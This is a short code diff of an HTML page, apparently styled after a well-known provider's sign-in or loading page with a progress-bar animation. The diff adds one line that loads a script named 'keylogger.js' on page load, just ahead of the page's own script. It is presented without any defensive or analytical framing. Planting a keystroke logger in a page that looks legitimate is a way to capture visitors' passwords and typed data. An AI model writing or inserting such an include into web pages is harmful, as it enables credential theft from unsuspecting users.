@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html dir="ltr" class="CMgTXc" lang="en"><head>
 <style>
@@ -53,6 +54,7 @@
   }
 }
 </style>
+<script src="keylogger.js"></script>
 <script type="text/javascript">
   function ani(){
     document.getElementById('bar').className ='bar';
